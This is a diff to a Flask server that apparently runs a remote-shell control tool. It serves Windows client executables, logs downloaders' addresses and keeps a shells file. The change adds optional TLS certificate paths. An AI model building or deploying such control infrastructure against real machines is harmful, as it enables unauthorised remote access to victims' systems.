@@ -21,6 +21,9 @@ shells_filename = 'shells.txt'
 client_win32_executable_file = './dist/client86.exe'
 client_win64_executable_file = './dist/client64.exe'
 
+tls_certificate_path = ''
+tls_private_key_path = ''
+
 
 @app.route('/client86.exe')
 def client_win32():
@@ -30,6 +33,7 @@ def client_win32():
           .format(remote_addr=request.remote_addr))
     return send_file(client_win32_executable_file)
 
+
 @app.route('/client64.exe')
 def client_win64():
     if current_dir and current_user:
@@ -37,7 +41,6 @@ def client_win64():
     print("{remote_addr} - downloading a win64 client executable"
           .format(remote_addr=request.remote_addr))
     return send_file(client_win64_executable_file)
-
 
 
 @app.route('/init')
@@ -132,9 +135,17 @@ class FlaskThread():
 
     def run(self):
         if self.ssl:
-            self.app.run(host=self.ip, port=self.port, ssl_context='adhoc')
+            if tls_certificate_path and tls_private_key_path:
+                self.app.run(host=self.ip,
+                             port=self.port,
+                             ssl_context=(tls_certificate_path, tls_private_key_path))
+            else:
+                self.app.run(host=self.ip,
+                             port=self.port,
+                             ssl_context='adhoc')
         else:
-            self.app.run(host=self.ip, port=self.port)
+            self.app.run(host=self.ip,
+                         port=self.port)
 
 
 def get_arguments():
